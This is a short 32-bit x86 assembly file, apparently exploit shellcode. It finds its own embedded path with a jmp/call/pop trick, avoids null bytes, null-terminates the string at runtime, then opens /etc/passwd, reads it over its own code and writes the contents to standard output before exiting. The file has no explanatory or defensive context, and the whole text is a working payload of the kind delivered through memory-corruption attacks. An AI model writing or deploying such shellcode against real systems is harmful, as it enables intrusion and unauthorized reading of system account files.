        .intel_syntax noprefix
        .globl _start
_start:
        jmp caller
callee:
        pop ebx
        xor ecx, ecx
        mov cl, [ebx]
        inc ebx
        mov [ebx+ecx], ch
main:
        xor edi, edi
        xor ecx, ecx
        lea eax, [edi+5]
        int 0x80
        xchg ebx, eax
        xchg ecx, eax
        lea edx, [edi+1]
        shl edx, 16
        lea eax, [edi+3]
        int 0x80
        xchg edx, eax
        lea ebx, [edi+1]
        lea eax, [edi+4]
        int 0x80
        xor ebx, ebx
        lea eax, [edi+1]
        int 0x80
caller:
        call callee
arg:
        .byte 11
        .ascii "/etc/passwd"
